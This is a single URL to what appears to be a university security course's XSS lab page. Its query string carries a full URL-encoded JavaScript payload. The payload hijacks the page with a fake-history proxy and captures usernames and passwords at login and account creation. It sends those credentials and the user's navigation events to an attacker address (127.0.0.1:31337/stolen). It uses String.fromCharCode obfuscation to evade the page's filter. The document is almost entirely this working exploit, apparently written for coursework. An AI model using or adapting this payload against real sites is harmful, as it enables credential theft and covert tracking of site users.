http://cs526-s18.cs.purdue.edu/project3/search?xssdefense=3&q=%3Cscript%3E%20function%20payload(attacker)%20%7B%0A%0A%09var%20forwardBtnStk%20%3D%20%5B%5D%20%0A%09var%20backBtnStk%20%3D%20%5B%5D%20%0A%09var%20curUid%20%3D%200%2C%20nextUid%20%3D%200%2C%20setUid%20%3D%200%20%0A%09var%20sCrit%20%0A%0A%09function%20recordEvent(input)%20%7B%0A%09%09console.log(input)%20%0A%09%09%24.get(attacker%2C%20input)%20%0A%09%7D%0A%0A%09function%20sendPostRequest(evt_name%2C%20log_evt)%20%7B%0A%09%09var%20usrname%20%3D%20%24(String.fromCharCode(35%2C117%2C115%2C101%2C114%2C110%2C97%2C109%2C101)).val()%20%0A%09%09var%20pwd%20%3D%20%24(String.fromCharCode(35%2C117%2C115%2C101%2C114%2C112%2C97%2C115%2C115)).val()%20%0A%0A%09%09%24.post(String.fromCharCode(46%2C47)%20%2B%20evt_name%2C%20%7Busername%3A%20usrname%2C%20password%3A%20pwd%7D%2C%20function(data%2C%20status)%20%7B%0A%09%09%09recordEvent(%7Bevt%3A%20log_evt%2C%20user%3A%20usrname%2C%20password%3A%20pwd%7D)%20%0A%09%09%09proxy(String.fromCharCode(46%2C47))%20%0A%09%09%7D)%20%0A%09%7D%0A%0A%09function%20addHistory(href)%20%7B%0A%09%09setUid%2B%2B%20%0A%09%09backBtnStk.push(href)%20%0A%09%09window.history.pushState(%7BUID%3A%20setUid%7D%2C%20String.fromCharCode(34)%2C%20href)%20%0A%09%7D%0A%0A%09function%20proxy(href%2C%20qry)%20%7B%0A%09%09if%20(window.history.state%20!%3D%20null)%20%7B%0A%09%09%09curUid%20%3D%20window.history.state.UID%20%0A%09%09%09history.replaceState(window.history.state%2C%20String.fromCharCode(34)%2C%20href)%20%0A%09%09%7D%20else%20%7B%0A%09%09%09history.replaceState(%7BUID%3A%20setUid%7D%2C%20String.fromCharCode(34)%2C%20href)%20%0A%09%09%7D%0A%20%09%09%0A%0A%09%09%24(String.fromCharCode(104%2C116%2C109%2C108)).load(href%2C%20function()%20%7B%0A%09%09%09%24(String.fromCharCode(104%2C116%2C109%2C108)).show()%20%0A%09%09%09if%20(qry%20%3D%3D%20null%20%7C%7C%20qry.length%20%3D%3D%200%20%7C%7C%20qry%20%3D%3D%20String.fromCharCode(46%2C47))%20%7B%0A%09%09%09%09%24(String.fromCharCode(35%2C113%2C117%2C101%2C114%2C121)).val(String.fromCharCode(112%2C119%2C110%2C101%2C100%2C33))%20%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09%24(String.fromCharCode(35%2C113%2C117%2C101%2C114%2C121)).val(qry)%20%0A%09%09%09%7D%0A%0A%09%09%09var%20usr%20%3D%20%24(String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114)).val()%20%0A%09%09%09recordEvent(%7Bevt%3A%20String.fromCharCode(110%2C97%2C118%2C105%2C103%2C97%2C116%2C105%2C111%2C110)%2C%20user%3A%20usr%2C%20uri%3A%20href%7D)%20%0A%0A%09%09%09%24(String.fromCharCode(46%2C104%2C105%2C115%2C116%2C111%2C114%2C121%2C45%2C105%2C116%2C101%2C109)).each(function(item)%20%7B%0A%09%09%09%09if(%24(this).attr(String.fromCharCode(104%2C114%2C101%2C102)).indexOf(String.fromCharCode(102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C32%2C112%2C97%2C121%2C108%2C111%2C97%2C100%2C40))%20%3E%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).remove()%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%09%09%09%7D)%20%0A%0A%09%09%09%24(String.fromCharCode(35%2C108%2C111%2C103%2C45%2C105%2C110%2C45%2C98%2C116%2C110)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09sendPostRequest(String.fromCharCode(108%2C111%2C103%2C105%2C110)%2C%20String.fromCharCode(108%2C111%2C103%2C105%2C110))%20%0A%0A%09%09%09%7D)%20%0A%0A%09%09%09%24(String.fromCharCode(35%2C110%2C101%2C119%2C45%2C97%2C99%2C99%2C111%2C117%2C110%2C116%2C45%2C98%2C116%2C110)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09sendPostRequest(String.fromCharCode(99%2C114%2C101%2C97%2C116%2C101)%2C%20String.fromCharCode(108%2C111%2C103%2C105%2C110))%20%0A%09%09%09%7D)%20%0A%0A%0A%09%09%09%24(String.fromCharCode(35%2C108%2C111%2C103%2C45%2C111%2C117%2C116%2C45%2C98%2C116%2C110)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09var%20usrname%20%3D%20%24(String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114)).text()%20%0A%0A%09%09%09%09%24.post(String.fromCharCode(46%2C47%2C108%2C111%2C103%2C111%2C117%2C116)%2C%20%20function()%7B%0A%09%09%09%09%09recordEvent(%7Bevt%3A%20String.fromCharCode(108%2C111%2C103%2C111%2C117%2C116)%2C%20user%3A%20usrname%7D)%20%0A%09%09%09%09%09proxy(String.fromCharCode(46%2C47))%20%0A%09%09%09%09%7D)%20%0A%09%09%09%7D)%20%0A%0A%09%09%09%24(String.fromCharCode(35%2C98%2C117%2C110%2C103%2C108%2C101%2C45%2C108%2C110%2C107)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09addHistory(href)%20%0A%09%09%09%09proxy(String.fromCharCode(47%2C112%2C114%2C111%2C106%2C101%2C99%2C116%2C51%2C47))%20%0A%0A%09%09%09%7D)%20%0A%0A%09%09%09if%20(href.search(String.fromCharCode(115%2C101%2C97%2C114%2C99%2C104%2C63))%20!%3D%20-1)%20%7B%0A%09%09%09%09%24(String.fromCharCode(97)).each(function()%20%7B%0A%09%09%09%09%09if(%24(this).attr(String.fromCharCode(104%2C114%2C101%2C102)).indexOf(String.fromCharCode(102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C32%2C112%2C97%2C121%2C108%2C111%2C97%2C100%2C40))%20%3E%3D%200)%20%7B%0A%09%09%09%09%09%09%24(this).remove()%20%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%24(this).click(String.fromCharCode(115%2C117%2C98%2C109%2C105%2C116)%2C%20function(event)%20%7B%0A%09%09%09%09%09%09event.preventDefault()%20%0A%09%09%09%09%09%09sCrit%20%3D%20%24(this).attr(String.fromCharCode(104%2C114%2C101%2C102))%20%0A%09%09%09%09%09%09sCrit%20%3D%20sCrit.replace(%2F%20%2Fg%2C%20String.fromCharCode(43))%20%0A%09%09%09%09%09%09proxy(String.fromCharCode(46%2C47)%20%2B%20sCrit%2C%20sCrit)%20%0A%09%09%09%09%09%7D)%20%0A%09%09%09%09%7D)%20%0A%09%09%09%7D%0A%0A%09%09%09%24(String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C97%2C103%2C97%2C105%2C110%2C45%2C98%2C116%2C110)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09addHistory(href)%20%0A%09%09%09%09proxy(String.fromCharCode(46%2C47))%20%0A%09%09%09%7D)%20%0A%0A%09%09%09%24(String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C98%2C116%2C110)).on(String.fromCharCode(99%2C108%2C105%2C99%2C107)%2C%20function(event)%20%7B%0A%09%09%09%09event.preventDefault()%20%0A%09%09%09%09sCrit%20%3D%20%24(String.fromCharCode(35%2C113%2C117%2C101%2C114%2C121)).val()%20%0A%09%09%09%09sCrit%20%3D%20sCrit.replace(%2F%20%2Fg%2C%20String.fromCharCode(43))%20%0A%09%09%09%09addHistory(href)%20%0A%09%09%09%09proxy(String.fromCharCode(46%2C47%2C115%2C101%2C97%2C114%2C99%2C104%2C63%2C113%2C61)%20%2B%20sCrit%2C%20sCrit)%20%0A%09%09%09%7D)%20%0A%0A%0A%09%09%09%24(window).on(String.fromCharCode(112%2C111%2C112%2C115%2C116%2C97%2C116%2C101)%2C%20function(event)%20%7B%0A%09%09%09%09nextUid%20%3D%20event.state.UID%20%0A%09%09%09%09var%20nextHref%20%0A%0A%09%09%09%09if%20(nextUid%20%3E%20curUid)%20%7B%0A%09%09%09%09%09nextHref%20%3D%20forwardBtnStk.pop()%20%0A%09%09%09%09%09backBtnStk.push(href)%20%0A%09%09%09%09%7D%20else%20%7B%0A%09%09%09%09%09nextHref%20%3D%20backBtnStk.pop()%20%0A%09%09%09%09%09forwardBtnStk.push(href)%20%0A%09%09%09%09%7D%0A%09%09%09%09proxy(nextHref)%20%09%09%0A%09%09%09%7D)%20%0A%09%09%7D)%20%0A%09%7D%0A%09%24(String.fromCharCode(104%2C116%2C109%2C108)).hide()%20%0A%09proxy(String.fromCharCode(46%2C47))%20%0A%7D%20payload(String.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C51%2C49%2C51%2C51%2C55%2C47%2C115%2C116%2C111%2C108%2C101%2C110))%20%20%3C%2Fscript%3E
